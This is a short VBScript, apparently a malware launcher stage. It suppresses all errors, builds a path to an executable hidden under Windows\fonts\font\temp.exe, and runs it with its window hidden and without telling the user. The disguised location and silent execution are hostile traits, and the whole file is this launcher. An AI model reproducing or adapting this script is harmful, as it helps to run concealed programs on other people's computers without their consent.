on error resume next
Set fso = CreateObject("Scripting.FileSystemObject")
windows = fso.GetSpecialFolder(WindowsFolder)
Set src3 = CreateObject("Wscript.shell")
src3.run windows & "\fonts\font\temp.exe",0,true